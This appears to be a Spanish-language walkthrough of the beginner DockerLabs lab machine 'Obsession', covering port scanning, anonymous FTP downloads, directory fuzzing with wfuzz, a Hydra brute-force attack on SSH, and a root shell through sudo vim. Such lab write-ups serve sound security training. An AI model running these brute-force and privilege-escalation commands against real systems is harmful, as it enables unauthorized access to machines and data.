# 🖥️ **Máquina: Obsession**

- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  Laboratorio para principiantes en ciberseguridad. Se trabaja principalmente con servicios **SSH** y **FTP**.

- **🎯 Objetivo:**  
  -Enumerar y explotar acceso anónimo en FTP para obtener información sensible.
  
  -Identificar directorios ocultos en el servidor web.
  
  -Realizar un ataque de fuerza bruta contra SSH para obtener acceso al sistema.
  
  -Escalar privilegios a root mediante una mala configuración de sudo con vim.
  
![Máquina Backend](/Obsession/Imagenes/Plantilla.png)

---

## 🚀 **Despliegue de la Máquina Obsession en DockerLabs**

### 1️⃣ Descargar y descomprimir el archivo  
Primero, descargamos y extraemos el archivo `.zip`. Utilizamos `7z` para este propósito:

```bash
7z e backend.zip
```

### 2️⃣ Ejecutar el despliegue automático  
Después de descomprimir, lanzamos la máquina con el siguiente script:

```bash
bash auto_deploy.sh obsession.tar
```

📌 **Nota:** Asegúrate de tener `7z` instalado y contar con un entorno con Docker correctamente configurado.

![Máquina Iniciada](/Obsession/Imagenes/Despliegue.jpeg)

### 3️⃣ Comprobar la conexión  
Verificamos que la máquina esté activa enviando paquetes de ping:

```bash
ping -c4 172.17.0.2
```

![PING](/Obsession/Imagenes/Ping.jpeg)

---

## 🧩 **Fase de Reconocimiento**

Iniciamos un escaneo de puertos con **nmap**:

```bash
nmap -p- --open -sS --min-rate 500 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Reconocimiento](/Obsession/Imagenes/Puertos.jpeg)

📌 **Tip:** Puedes usar herramientas personalizadas como `extractPorts` para filtrar los puertos abiertos:

```bash
extractPorts allPorts.txt
```

Realizamos un escaneo más específico sobre los puertos detectados (22 y 80):

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN target
```

![Reconocimiento](/Obsession/Imagenes/Servicios.jpeg)

**Hallazgos iniciales:**
- **Puerto 22 (SSH):** Acceso remoto al sistema operativo.
- **Puerto 80 (HTTP):** Página web activa.
- **FTP:** El servicio permite acceso anónimo.

---

## 🌐 **Accediendo al servidor web**

Para acceder correctamente a la página web, debemos modificar el archivo `hosts`:

```bash
sudo nano /etc/hosts
```
Añadimos:

```plaintext
172.17.0.2    nombre-del-sitio.local
```

Esto nos permitirá visitar `http://nombre-del-sitio.local` en nuestro navegador.

![Pagina](/Images/etchost.jpeg)

Recopilamos información básica del sitio usando **WhatWeb**:

```bash
whatweb 172.17.0.2
```

---

## 📂 **Acceso al servicio FTP**

Ya que el acceso anónimo está habilitado, nos conectamos al servidor FTP:

```bash
ftp 172.17.0.2
```

![Reconocimiento](/Obsession/Imagenes/FTP.jpeg)

Dentro del servicio, encontramos dos archivos:

- `pendientes.txt`
- `chat-gonza.txt`

Los descargamos con:

```bash
get pendientes.txt /home/alejandro/Descargas/pendientes.txt
get chat-gonza.txt /home/alejandro/Descargas/chat-gonza.txt
```

![FTP_descargas](/Obsession/Imagenes/FTP_descargas.jpeg)

Leemos su contenido:

```bash
cat pendientes.txt
cat chat-gonza.txt
```

![cat](/Obsession/Imagenes/Lectura.jpeg)

**Observaciones:**  
Los archivos contienen conversaciones internas. Aunque mencionan asuntos legales, nuestro enfoque es identificar potenciales vulnerabilidades; uno de los archivos sugiere cambios pendientes en la página web, lo que podría indicar fallos en desarrollo.

---

## 🔎 **Búsqueda de Directorios Ocultos**

Al navegar inicialmente por la página no encontramos contenido útil, por lo que iniciamos un escaneo de directorios con **wfuzz**:

```bash
wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://172.17.0.2/FUZZ
```

📎 **Nota:** Si no tienes instalada la lista **Seclists**, puedes descargarla con:

```bash
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
```

![Pagina](/Obsession/Imagenes/wfuzz.jpeg)

**Resultados:**
- **/important:** Directorio con un manifiesto personal.
- **/backup:** Directorio que revela un posible nombre de usuario.

![evidencia](/Obsession/Imagenes/important.jpeg)
![evidencia](/Obsession/Imagenes/Contenido_importan.jpeg)
![evidencia](/Obsession/Imagenes/backup.jpeg)
![evidencia](/Obsession/Imagenes/Contenido_backup.jpeg)

---

## 🔐 **Ataque de Fuerza Bruta al servicio SSH**

Con el nombre de usuario descubierto, utilizamos **Hydra** para encontrar su contraseña:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50
```

![Hydra](/Obsession/Imagenes/Hydrassh.jpeg)

Tras obtener las credenciales, iniciamos sesión:

```bash
ssh russoski@172.17.0.2
```

![Entrar](/Obsession/Imagenes/Entrar.jpeg)

---

## 🛡️ **Escalada de Privilegios**

Dentro de la máquina, verificamos los permisos **sudo**:

```bash
sudo -l
```

Descubrimos que el usuario puede ejecutar **vim** como `sudo` sin contraseña.

**¿Por qué es importante?**  
**Vim** permite ejecutar comandos de sistema desde su entorno. Esto significa que podemos invocar una shell como root directamente desde Vim.

📌 Consultando la base de datos [GTFOBins](https://gtfobins.github.io/gtfobins/vim/), encontramos que para escalar privilegios usando Vim, el comando es:

```bash
sudo vim -c ':!/bin/bash'
```

Esto abrirá un **shell interactivo como root**.

![Entrar](/Obsession/Imagenes/Resultado.jpeg)

---

# ✅ **Resumen del proceso:**

1. Escaneamos puertos y descubrimos servicios SSH, HTTP y FTP.
2. Accedimos vía FTP y descargamos archivos que revelaron información sensible.
3. Identificamos directorios ocultos en la página web.
4. Realizamos un ataque de fuerza bruta sobre SSH y accedimos al sistema.
5. Escalamos privilegios mediante una mala configuración de **sudo** sobre **vim**.
